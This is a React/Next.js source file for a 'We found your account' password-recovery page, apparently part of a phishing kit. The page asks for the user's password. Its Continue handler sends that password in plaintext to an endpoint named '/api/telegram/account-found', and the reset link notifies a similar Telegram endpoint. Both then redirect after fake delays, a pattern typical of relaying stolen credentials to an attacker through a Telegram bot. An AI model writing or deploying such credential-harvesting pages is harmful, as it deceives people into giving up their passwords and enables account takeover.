"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { HelpCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteFooter } from "@/components/site-footer";
import { SiteHeader } from "@/components/site-header";
import { Input } from "@/components/ui/input";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";

export default function ForgotPasswordFoundPage() {
  const router = useRouter();
  const [password, setPassword] = useState("");
  const [verificationMethod, setVerificationMethod] = useState("password");
  const [isLoading, setIsLoading] = useState(false);
  const [isResetLoading, setIsResetLoading] = useState(false);

  const handleContinue = async () => {
    if (isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/account-found", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          method: "Password",
          password,
        }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send account found notification:", error);
    }

    await new Promise((r) => setTimeout(r, 1500));
    router.push("/forgot-password-verify");
  };

  const handleResetPasswordClick = async () => {
    if (isResetLoading) return;
    setIsResetLoading(true);
    try {
      await fetch("/api/telegram/account-found-reset-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send reset password link notification:", error);
    }

    await new Promise((r) => setTimeout(r, 2000));
    setIsResetLoading(false);
    router.push("/forgot-password-verify");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <main className="px-4 py-6 md:hidden flex-1">
        <div className="mx-auto max-w-md rounded-lg border border-gray-200 bg-white p-4 shadow-sm">
          <div className="flex items-center gap-2 mb-2">
            <h1 className="text-xl font-semibold text-gray-900">We found your account</h1>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>
          <p className="text-sm text-gray-700 mb-4">For your user ID, enter your password to continue.</p>

          <div className="space-y-4">
            <Input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder=""
              className="w-full h-10 bg-white border-gray-300 rounded-md"
            />

            <div className="text-sm text-gray-700">
              <span>Don&apos;t remember your password? </span>
              <button
                type="button"
                onClick={handleResetPasswordClick}
                disabled={isResetLoading}
                className="text-[#254650] hover:underline disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {isResetLoading ? "Loading..." : "Reset password"}
              </button>
            </div>

            <div className="flex gap-3 pt-2">
              <Button
                onClick={handleContinue}
                disabled={isLoading || !password}
                className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
              >
                {isLoading ? "Loading..." : "Continue"}
              </Button>
              <Button
                type="button"
                className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
                onClick={() => router.push("/forgot-password")}
              >
                Cancel
              </Button>
            </div>
          </div>
        </div>
      </main>

      <div className="hidden md:block max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15 flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h1 className="text-2xl font-semibold text-gray-900">
            We found your account
          </h1>
          <button
            type="button"
            className="text-[#254650] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>
        <p className="text-gray-700 text-sm mb-6">
          For your user ID, enter your password to continue.
        </p>

        <div className="space-y-5">
          <div className="flex items-center gap-3 flex-wrap">
            <Input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder=""
              className="max-w-75 h-10 bg-white border-gray-300 rounded-md"
            />
          </div>

          <div className="pt-2 text-sm text-gray-700">
            <span>Don&apos;t remember your password? </span>
            <button
              type="button"
              onClick={handleResetPasswordClick}
              disabled={isResetLoading}
              className="text-[#254650] hover:underline disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {isResetLoading ? "Loading..." : "Reset password"}
            </button>
          </div>

          <div className="flex gap-3 pt-4">
            <Button
              onClick={handleContinue}
              disabled={isLoading || !password}
              className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/forgot-password")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  );
}
